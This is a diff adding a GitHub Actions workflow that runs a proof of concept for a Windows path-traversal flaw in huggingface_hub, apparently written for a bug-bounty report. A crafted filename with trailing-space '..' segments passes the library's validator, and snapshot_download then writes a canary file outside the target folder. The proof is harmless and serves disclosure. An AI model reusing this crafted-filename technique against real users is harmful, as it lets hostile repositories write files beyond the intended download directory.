@@ -1,0 +1,56 @@
+name: Windows path validation
+on:
+  workflow_dispatch:
+  push:
+jobs:
+  validate:
+    runs-on: windows-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Install latest huggingface_hub main
+        shell: pwsh
+        run: python -m pip install --disable-pip-version-check "huggingface_hub @ git+https://github.com/huggingface/huggingface_hub.git@main"
+      - name: Run harmless containment proof
+        shell: pwsh
+        env:
+          HF_HUB_DISABLE_XET: "1"
+        run: |
+          @'
+          from pathlib import Path
+          import os
+          import huggingface_hub
+          from huggingface_hub import snapshot_download
+          from huggingface_hub._local_folder import _validate_relative_filename
+
+          repo_id = "huntingislove/h1-winpath-space-poc-20260906"
+          crafted = "nested/.. /.. /h1-canary.txt"
+          root = Path(os.environ["RUNNER_TEMP"]) / "hf-h1-winpath"
+          local_dir = root / "victim-download"
+          local_dir.mkdir(parents=True, exist_ok=True)
+          escaped = root / "h1-canary.txt"
+          contained_literal = local_dir / "nested" / ".. " / ".. " / "h1-canary.txt"
+
+          print("huggingface_hub_version=", huggingface_hub.__version__)
+          print("crafted=", repr(crafted))
+          _validate_relative_filename(crafted)
+          print("latest_validator=ACCEPT")
+          result = snapshot_download(repo_id, local_dir=local_dir)
+          print("snapshot_result=", result)
+          print("escaped_path=", escaped)
+          print("escaped_exists=", escaped.exists())
+          print("literal_path_exists=", contained_literal.exists())
+          if escaped.exists():
+              data = escaped.read_text()
+              print("escaped_content=", repr(data))
+              assert data.strip() == "HF-WINDOWS-PATH-CANARY"
+              print("CONFIRMED: attacker repository filename escaped local_dir on current Windows")
+          else:
+              print("tree=")
+              for path in root.rglob("*"):
+                  print(path.relative_to(root))
+              raise AssertionError("No containment escape observed")
+          '@ | Set-Content -Encoding UTF8 poc.py
+          python poc.py
